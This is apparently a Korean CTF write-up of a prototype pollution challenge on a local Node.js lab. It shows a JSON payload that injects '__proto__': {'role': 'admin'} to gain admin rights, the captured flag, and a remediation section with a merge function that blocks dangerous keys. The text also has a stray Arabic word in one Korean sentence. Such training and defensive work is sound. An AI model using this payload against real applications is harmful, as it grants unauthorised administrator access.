+++
title = "VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Prototype Pollution", "Bronze", "Node.js", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Prototype Pollution)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/proto/bronze`
- **목표**: Node.js 백엔드에서 JSON 데이터를 병합(Merge)할 때 발생하는 **프로토타입 오염(Prototype Pollution)** 취약점을 악용하여, 시스템 전역 객체의 원형(Prototype)을 오염시키고 관리자 권한을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/proto/bronze` 경로에 접근하여 회원가입(또는 프로필 업데이트) API에 일반적인 JSON 데이터를 보내봅니다.

**[정상 요청 테스트]**
```http
POST /proto/bronze HTTP/1.1
Content-Type: application/json

{
  "username": "guest",
  "preferences": {
    "theme": "dark"
  }
}
```

**[서버의 응답]**
```json
{
  "status": "success",
  "message": "User guest created.",
  "role": "user"
}
```

**[해커의 사고 과정]**
1. 백엔드는 Node.js(JavaScript)로 작성되어 있을 확률이 높다.
2. 클라이언트가 보낸 중첩된(Nested) JSON 객체를 백엔드에서 기본 설정(Default Config) 객체와 병합(Merge)하는 로직이 있을 것이다.
3. 자바스크립트는 모든 객체가 `__proto__` 라는 숨겨진 속성을 통해 최상위 원형(Prototype)에 접근할 수 있다.
4. 만약 병합(Merge) 함수가 `__proto__` 라는 키를 필터링하지 않고 그대로 병합한다면, **자바스크립트 엔진 전체의 기본 객체(`Object.prototype`)가 오염**될 것이다!

---

## 💥 2. 취약점 식별 및 악성 JSON 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --({"__proto__": {"role": "admin"}})--> [ Web Server ]
                                                     |-- merge()
                                                     |-- Global Object Polluted
```


이른바 **Prototype Pollution (프로토타입 오염)** 공격입니다.

### 💡 페이로드 설계
서버가 권한 검사를 할 때 `if (user.role === 'admin')` 처럼 검사한다고 가정합시다. 만약 `user` 객체에 `role` 속성이 없다면, 자바스크립트는 프로토타입 체인을 타고 올라가 `Object.prototype.role` 을 찾게 됩니다.

따라서 우리는 모든 객체의 조상인 `Object.prototype`에 `role: "admin"` 을 심어두면 됩니다.

**[주입할 악성 JSON 페이로드]**
```json
{
  "username": "hacker",
  "preferences": {
    "theme": "dark"
  },
  "__proto__": {
    "role": "admin"
  }
}
```

*(주의: بعض HTTP 클라이언트나 브라우저는 `__proto__` 를 진짜 객체의 프로토타입으로 인식하여 전송 시 누락할 수 있으므로, Burp Suite나 cURL을 이용해 Raw 문자열(String) 형태로 전송해야 합니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

Burp Suite의 Repeater를 이용하여 조작된 JSON을 서버로 날립니다.

```http
POST /proto/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "username": "hacker",
  "preferences": {
    "theme": "dark"
  },
  "__proto__": {
    "role": "admin"
  }
}
```

### 🔍 서버 내부의 동작 (Attack Chain)
1. 백엔드의 취약한 병합 함수(예: Lodash의 구버전 `merge()` 등)가 이 JSON을 파싱합니다.
2. 루프를 돌면서 키를 복사하다가 `__proto__` 키를 만납니다.
3. 함수는 `target.__proto__.role = "admin"` 을 실행합니다.
4. 이 순간, Node.js 메모리상의 **모든 빈 객체(`{}`)가 기본적으로 `role: "admin"` 이라는 속성을 가지게 됩니다!** (전역 오염)

### 🔍 조작된 서버의 응답
오염 직후, 서버는 해커의 권한을 체크합니다. 해커의 DB 레코드에는 `role` 값이 없었지만, 프로토타입 체인을 타고 올라가 전역 오염된 `"admin"` 값을 가져오게 됩니다.

```json
{
  "status": "success",
  "message": "Welcome, Administrator. Global object polluted.",
  "flag": "FLAG{PROTO_🥉_BASIC_POLLUTION_D4E5F6}"
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

JavaScript 언어의 고유한 상속 모델(Prototypal Inheritance)을 악용하여, 단 하나의 악성 요청으로 서버 전역(Global)의 비즈니스 로직을 마비시키고 권한을 탈취하는 프로토타입 오염 공격을 완벽하게 수행했습니다.

**🔥 획득한 플래그:**
`FLAG{PROTO_🥉_BASIC_POLLUTION_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
JSON 객체의 깊은 복사(Deep Copy)나 병합(Merge)을 수행할 때, 자바스크립트의 예약어인 `__proto__`, `constructor`, `prototype` 키를 필터링하지 않은 것이 근본 원인입니다.

* **안전한 패치 가이드 (키 필터링 및 라이브러리 업데이트)**
1. **취약한 라이브러리 업데이트**: `lodash`, `merge`, `hoek` 등 많이 쓰이는 병합 라이브러리들은 과거에 이 취약점을 겪고 패치를 완료했습니다. 무조건 최신 버전으로 업데이트해야 합니다.
2. **명시적인 키 차단 로직 (Sanitization)**: 직접 병합 함수를 짤 경우, 객체를 순회할 때 위험한 키를 건너뛰어야 합니다.
```javascript
// 안전한 병합 함수 예시
function safeMerge(target, source) {
    for (let key in source) {
        // 프로토타입 체인 오염을 막기 위한 방어 코드
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```
3. **프로토타입 없는 객체 생성**: `Object.create(null)` 을 사용하여 객체를 만들면 `__proto__` 가 없는 완전한 빈 껍데기가 되므로 오염 공격을 원천적으로 막을 수 있습니다.